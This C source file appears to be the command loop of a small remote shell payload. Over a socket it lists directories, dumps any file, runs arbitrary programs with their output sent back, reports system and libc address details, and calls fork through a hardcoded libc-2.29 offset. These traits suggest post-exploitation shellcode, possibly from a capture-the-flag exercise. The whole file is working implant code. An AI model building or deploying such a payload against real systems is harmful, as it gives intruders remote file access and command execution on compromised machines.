#include "include.h"

void write_int(int s, long code, int radix)
{
  long itoabuf[2];
  int len;
  len = _ltoa(code, (char *)itoabuf, radix);
  ((char *)itoabuf)[len] = '\n';
  ((char *)itoabuf)[len + 1] = '0';
  write(s, (char *)itoabuf, len + 1);
}

void cat_command(data_t *data, const char *path)
{
  int fd, nread, count;

  fd = _open(path, O_RDONLY, 0);
  if (fd < 0)
  {
    PRINT_ERROR(data->s, "open()");
    return;
  }

#ifndef _COMPACT
  PRINT_TEXT(data->s, "- Listing file ");
  PRINT_STR(data->s, path);
  PRINT_CHARS(data->s, data->symbols.newline);
#endif

  count = 0;

  for (;;)
  {
    nread = read(fd, data->temp, BUFSIZ);
    if (nread < 0)
    {
      close(fd);
      PRINT_ERROR(data->s, "read()");
      return;
    }

    if (nread != 0)
    {
      PRINT_LEN(data->s, data->temp, nread);
      count += nread;
    }
    else
      break;
  }

  close(fd);

#ifndef _COMPACT
  PRINT_TEXT(data->s, "\n- Total: ");
  PRINT_INT(data->s, count);
#endif
}

void exec_command(data_t *data, const char *path)
{
  char *args[10];
  int res = 0;
  char *ptr, *begin;
  int /*in[2], */ out[2], pid;

  ptr = begin = (char *)path;
  for (;;)
  {
    if (!*ptr)
      break;
    if (*ptr == ' ')
    {
      *ptr = 0;
      args[res++] = begin;
      begin = ptr + 1;
    }
    ptr++;
  }
  args[res] = begin;
  args[res + 1] = 0;

  // pipe(in);
  pipe(out);

#ifdef LIBC
  if (data->libc_addr)
  {
    // libc fork() uses sys_clone syscall internally so it could be used when sys_fork is unavailable
    // however following code is highly version dependent and 0xc19b0 offset is only valid for libc-2.29 that I'm using

    pid = (*(int(*)())(data->libc_addr + 0xc19b0))();
  }
  else
#endif
    pid = fork();

  if (pid == -1)
  {
    PRINT_ERROR(data->s, "fork()");
    return;
  }

  if (pid == 0)
  {
    // // assign read end to stdin
    // dup2(in[0],  STDIN_FILENO);
    // assign write end to stdout
    dup2(out[1], STDOUT_FILENO);
    // assign write end to stderr
    dup2(out[1], STDERR_FILENO);

    // close pipes
    // close(in[0]); close(in[1]);
    close(out[0]);
    close(out[1]);

    res = _execve(args[0], args, NULL);
    if (res < 0)
    {
      PRINT_INT(STDERR_FILENO, res);
      PRINT_ERROR(STDERR_FILENO, "do_exec()");
    }

    _exit(127);
    return;
  }

  // close(in[0]);
  close(out[1]);

  for (;;)
  {
    res = read(out[0], data->temp, BUFSIZ);
    if (res == 0)
      break;

    if (res < 0)
    {
      PRINT_ERROR(out[0], "read()");
      break;
    }

    write(data->s, data->temp, res);
  }

  //  close(in[1]);
  close(out[0]);
}

void ls_command(data_t *data, const char *path)
{
  int fd, nread, bpos, count, len;
  struct linux_dirent *d;
  char d_type;

  fd = _open(path, 0, 0); // It should be O_RDONLY | O_DIRECTORY, 0 but some linux functions use 0 instead. I'll try it first
  if (fd < 0)
  {
    PRINT_ERROR(data->s, "open()");
    return;
  }

#ifndef _COMPACT
  PRINT_TEXT(data->s, "- Listing ");
  PRINT_STR(data->s, path);
  PRINT_CHARS(data->s, data->symbols.newline);
#endif

  count = 0;

  nread = getdents64(fd, data->temp, BUFSIZ);

  if (nread > 0)
  {
    for (bpos = 0; bpos < nread;)
    {
      d = (struct linux_dirent *)(data->temp + bpos);
      d_type = *(data->temp + bpos + d->d_reclen - 1);
      bpos += d->d_reclen;

      PRINT_STR(data->s, d->d_name);
      PRINT_CHARS(data->s, data->symbols.newline);

      count++;
    }
  }
  else
  {
    PRINT_ERROR(data->s, "getdents64()");
  }

  close(fd);

#ifndef _COMPACT
  PRINT_TEXT(data->s, "- Total: ");
  PRINT_INT(data->s, count);
#endif
}

void uname_command(data_t *data)
{
  struct utsname *udata = (struct utsname *)data->temp;
  int res = uname(udata);

  if (res < 0)
  {
    PRINT_ERROR(data->s, "uname()");
    return;
  }

  PRINT_STR(data->s, udata->sysname);
  PRINT_CHARS(data->s, data->symbols.newline);
  PRINT_STR(data->s, udata->nodename);
  PRINT_CHARS(data->s, data->symbols.newline);
  PRINT_STR(data->s, udata->release);
  PRINT_CHARS(data->s, data->symbols.newline);
  PRINT_STR(data->s, udata->version);
  PRINT_CHARS(data->s, data->symbols.newline);
  PRINT_STR(data->s, udata->machine);
  PRINT_CHARS(data->s, data->symbols.newline);

#ifndef _COMPACT
  PRINT_TEXT(data->s, "Libc address: ");
  PRINT_HEX(data->s, data->libc_addr);
#else
  if (data->libc_addr)
  {
    PRINT_TEXT(data->s, "LIBC\n");
  }
  else
  {
    PRINT_TEXT(data->s, "No LIBC!\n");
  }
#endif
}

void readlink_command(data_t *data, const char *path)
{
  int len = readlink(path, data->temp, BUFSIZ);

  if (len < 0)
  {
    PRINT_ERROR(data->s, "readlink()");
    return;
  }

  PRINT_LEN(data->s, data->temp, len);
  PRINT_CHARS(data->s, data->symbols.newline);
}

inline void process_command(data_t *data)
{
  int len = data->command_len;

  if (len == 0)
    return;

  data->command_len = 0; // use only len after this!

  if (data->command[0] == 'l') // ls
  {
    if (len > 2 && data->command[1] == ' ')
      ls_command(data, data->command + 2);
#ifndef _COMPACT
    else if (len > 3 && data->command[1] == 's' && data->command[2] == ' ')
      ls_command(data, data->command + 3);
#endif
    else
      ls_command(data, data->symbols.curr_dir);
  }
  else if (data->command[0] == 'u') // uname
  {
    uname_command(data);
  }
  else if (data->command[0] == 'p') // pwd
  {
    char cwd[] = "/proc/self/cwd";
    readlink_command(data, cwd);
  }
  else if (data->command[0] == 'r') // readlink
  {
    if (len > 2 && data->command[1] == ' ')
      readlink_command(data, data->command + 2);
  }
  else if (data->command[0] == 'c') // cat or cd
  {
    if (len > 2 && data->command[1] == ' ')
      cat_command(data, data->command + 2);
#ifndef _COMPACT
    else if (len > 4 && data->command[1] == 'a' && data->command[2] == 't' && data->command[3] == ' ')
      cat_command(data, data->command + 4);
    else
      PRINT_TEXT(data->s, "Syntax: cat <file>\n");
#endif
  }
  else if (data->command[0] == 'e') // exec
  {
    if (len > 2 && data->command[1] == ' ')
      exec_command(data, data->command + 2);
#ifndef _COMPACT
    else if (len > 5 && data->command[1] == 'x' && data->command[2] == 'e' && data->command[3] == 'c' && data->command[4] == ' ')
      exec_command(data, data->command + 5);
    else
      PRINT_TEXT(data->s, "Syntax: exec <file>\n");
#endif
  }
  else if (data->command[0] == 'q') // quit
  {
    _exit(0);
  }
  else
#ifndef _COMPACT
    PRINT_TEXT(data->s, "Unknown command!\n");
#else
    PRINT_CHARS(data->s, data->symbols.error);
#endif
}
